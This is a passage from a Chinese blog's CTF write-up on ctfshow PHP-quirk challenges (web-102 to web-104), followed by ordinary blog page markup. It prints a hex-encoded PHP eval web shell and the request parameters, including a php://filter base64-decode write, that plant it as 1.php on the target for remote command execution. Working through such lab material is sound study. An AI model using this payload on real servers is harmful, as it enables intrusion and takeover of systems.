class="line">bin2hex把ascii码转为16进制</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">php5中is_numeric函数认识16进制数，而php7这个函数不识别16进制数，</span><br><span class="line">hex2bin将16进制转换为ascii码，&lt;?php eval($_POST[1]);?&gt;的16进制编码为</span><br><span class="line"></span><br><span class="line">0x3c3f706870206576616c28245f504f53545b315d293b3f3e</span><br><span class="line">php5:</span><br><span class="line">v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&amp;v3=1.php</span><br><span class="line">post:v1=hex2bin</span><br><span class="line">之后访问1.php</span><br><span class="line"></span><br><span class="line">php7:</span><br><span class="line">v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php </span><br><span class="line">post: v1=hex2bin</span><br><span class="line">需要随便填充一些数字，从第二个字符开始截取的(也就是第三个，是从0开始的)</span><br><span class="line">之后访问1.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="web-103"><a href="#web-103" class="headerlink" title="web-103"></a>web-103</h3><p>跟上题做法一模一样</p>
+<hr>
+<h3 id="web-104"><a href="#web-104" class="headerlink" title="web-104"></a>web-104</h3></div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">我很可爱，请给我钱</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045089.png"><img loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045089.png" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><span class="icon iconify" data-icon="ri:alipay-line"></span></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045492.png"><img loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045492.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><span class="icon iconify" data-icon="ri:qq-line"></span></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045283.png"><img loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406212045283.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>kinsey</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://kinsey973.github.io/2024/10/08/ctfshow-php%E7%89%B9%E6%80%A7/" title="ctfshow php特性">https://kinsey973.github.io/2024/10/08/ctfshow-php%E7%89%B9%E6%80%A7/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/10/08/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" rel="prev" title="ctfshow 信息搜集"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">ctfshow 信息搜集</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/10/08/2024-NSS%E7%A7%8B%E5%AD%A3%E8%B5%9B/" rel="next" title="2024.NSS秋季赛"><span class="post-nav-text">2024.NSS秋季赛</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>如果您有任何关于博客内容的相关讨论，欢迎前往 <a href="https://github.com/kinsey973/kinsey973.github.io/discussions" target="_blank">GitHub Discussions</a> 与我交流。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/10/08/ctfshow-php%E7%89%B9%E6%80%A7/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">苏ICP备17038157号</a></div><div class="copyright"><span>&copy; 2023 – 2024 </span><a class="with-love" id="animate" target="_blank" rel="noopener" href="https://github.com/kinsey973" title="Github"><span class="icon iconify" data-icon="ri:github-line"></span></a><span class="author"> kinsey</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-custom-text"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener" title="开往-友链接力"><img src="https://www.travellings.cn/assets/logo.gif" alt="开往-友链接力" width="120"></a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div><script>function initMourn() {
+  const date = new Date();
+  const today = (date.getMonth() + 1) + "-" + date.getDate()
+  const mourn_days = ["4-4","9-18"]
+  if (mourn_days.includes(today)) {
+    document.documentElement.style.filter = "grayscale(1)";
+  }
+}
+initMourn();</script></body></html>
